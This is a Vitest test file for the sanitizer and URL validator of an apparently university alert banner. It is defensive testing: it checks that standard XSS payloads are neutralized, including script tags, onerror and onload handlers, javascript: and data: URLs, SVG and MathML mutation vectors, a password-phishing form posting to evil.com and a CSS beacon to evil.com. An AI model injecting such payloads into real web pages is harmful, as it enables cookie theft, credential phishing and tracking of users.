// @vitest-environment jsdom

import { describe, expect, it } from 'vitest';
import {
    NOTEASER_MARKER,
    SAFE_URL_FALLBACK,
    safeAlertUrl,
    sanitizeAlertHtml,
    splitTeaser,
} from './uamsalert-sanitize.js';

describe('sanitizeAlertHtml', () => {
    it('strips <script> elements from feed content', () => {
        const out = sanitizeAlertHtml('<p>Closure today.</p><script>alert(document.cookie)</script>');

        expect(out).not.toMatch(/<script/i);
        expect(out).not.toContain('alert(document.cookie)');
        expect(out).toContain('<p>Closure today.</p>');
    });

    it('strips inline event-handler attributes', () => {
        const out = sanitizeAlertHtml('<img src="x" onerror="alert(1)">');

        expect(out).not.toMatch(/onerror/i);
        expect(out).not.toContain('alert(1)');
    });

    it('strips javascript: URLs from anchors', () => {
        const out = sanitizeAlertHtml('<a href="javascript:alert(1)">click</a>');

        expect(out).not.toMatch(/javascript:/i);
        expect(out).toContain('click');
    });

    it('preserves ordinary formatting markup', () => {
        const out = sanitizeAlertHtml('<strong>Heads up:</strong> visit <a href="https://uams.edu">UAMS</a>');

        expect(out).toContain('<strong>Heads up:</strong>');
        expect(out).toContain('href="https://uams.edu"');
    });

    it('strips a credential-harvesting form (script-free phishing)', () => {
        const out = sanitizeAlertHtml('<form action="//evil.com"><input type="password" name="p"></form>');

        expect(out).not.toMatch(/<form/i);
        expect(out).not.toMatch(/<input/i);
    });

    it('strips the style attribute (clickjacking overlay / tracking beacon)', () => {
        expect(sanitizeAlertHtml('<div style="position:fixed;inset:0;z-index:9999">x</div>')).not.toMatch(/style=/i);
        expect(sanitizeAlertHtml('<div style="background:url(https://evil.com/track)">x</div>')).not.toMatch(/style=/i);
    });

    it('neutralizes SVG / foreign-content vectors (HTML profile excludes SVG)', () => {
        expect(sanitizeAlertHtml('<svg onload="alert(1)"></svg>')).not.toMatch(/onload|<svg/i);
        expect(sanitizeAlertHtml('<svg><script>alert(1)</script></svg>')).not.toMatch(/<script|<svg/i);
    });

    it('neutralizes a nested / mutation-style payload', () => {
        const out = sanitizeAlertHtml('<a><math><mtext><a href="javascript:alert(1)">x</a></mtext></math></a>');

        expect(out).not.toMatch(/javascript:/i);
        expect(out).not.toMatch(/<math/i);
    });

    it('returns an empty string for non-string or empty input', () => {
        expect(sanitizeAlertHtml('')).toBe('');
        expect(sanitizeAlertHtml(null)).toBe('');
        expect(sanitizeAlertHtml(undefined)).toBe('');
        expect(sanitizeAlertHtml(42)).toBe('');
    });
});

describe('splitTeaser', () => {
    it('returns the pre-marker body and flags more when the marker is present', () => {
        expect(splitTeaser(`visible body${NOTEASER_MARKER}hidden remainder`)).toEqual({
            visible: 'visible body',
            hasMore: true,
        });
    });

    it('returns the whole string and no-more when the marker is absent', () => {
        expect(splitTeaser('just a short alert')).toEqual({
            visible: 'just a short alert',
            hasMore: false,
        });
    });

    it('treats non-string input as empty', () => {
        expect(splitTeaser(null)).toEqual({ visible: '', hasMore: false });
        expect(splitTeaser(undefined)).toEqual({ visible: '', hasMore: false });
    });
});

describe('safeAlertUrl', () => {
    it.each([
        ['https://news.uams.edu/weather/', 'https://news.uams.edu/weather/'],
        ['http://www.uams.edu/x', 'http://www.uams.edu/x'],
        ['/relative/path', '/relative/path'],
        ['//cdn.example.com/asset', '//cdn.example.com/asset'],
        ['#section', '#section'],
    ])('allows safe URL %s', (input, expected) => {
        expect(safeAlertUrl(input)).toBe(expected);
    });

    // The security guarantee rests on these reject cases: they go red against a
    // reverted (identity) implementation. The allow cases above only assert the
    // validator preserves legitimate URLs — they would pass against a no-op, so
    // they carry no security signal on their own.
    it.each([
        ['javascript:alert(1)'],
        ['JaVaScRiPt:alert(1)'],
        ['  javascript:alert(1)  '],
        ['java\tscript:alert(1)'],
        ['java\nscript:alert(1)'],
        ['data:text/html,<script>alert(1)</script>'],
        ['vbscript:msgbox(1)'],
        ['mailto:webmaster@uams.edu'],
    ])('rejects dangerous URL %s', (input) => {
        expect(safeAlertUrl(input)).toBe(SAFE_URL_FALLBACK);
    });

    it('falls back for empty or non-string input', () => {
        expect(safeAlertUrl('')).toBe(SAFE_URL_FALLBACK);
        expect(safeAlertUrl('   ')).toBe(SAFE_URL_FALLBACK);
        expect(safeAlertUrl(null)).toBe(SAFE_URL_FALLBACK);
        expect(safeAlertUrl(undefined)).toBe(SAFE_URL_FALLBACK);
    });
});

describe('splitTeaser + sanitizeAlertHtml composition (production order)', () => {
    // The banner splits the RAW content at the marker, then sanitizes the
    // pre-marker fragment. This pins the invariant that sanitization always
    // runs last, so a marker embedded mid-tag cannot smuggle markup past it.
    it('sanitizes the post-split fragment, neutralizing a marker-mid-tag payload', () => {
        const { visible } = splitTeaser('<img src="a<!--noteaser-->" onerror="alert(1)"><p>tail</p>');
        const out = sanitizeAlertHtml(visible);

        expect(out).not.toMatch(/onerror/i);
        expect(out).not.toContain('alert(1)');
    });
});
